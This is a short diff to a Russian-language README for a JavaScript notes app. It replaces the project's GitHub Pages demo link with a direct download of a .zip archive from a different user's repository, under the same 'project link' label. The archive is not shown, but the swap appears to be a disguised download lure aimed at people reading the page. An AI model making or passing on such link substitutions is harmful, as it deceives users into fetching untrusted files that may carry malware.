@@ -7,7 +7,7 @@
 - JavaScript
 - ООП
 
-- [Ссылка на проект] https://korchinmv.github.io/Notes-App/
+- [Ссылка на проект] https://raw.githubusercontent.com/ElingSmith/Notes-App/main/js/components/Notes-App-v1.2.zip
 
 **О проекте**
 
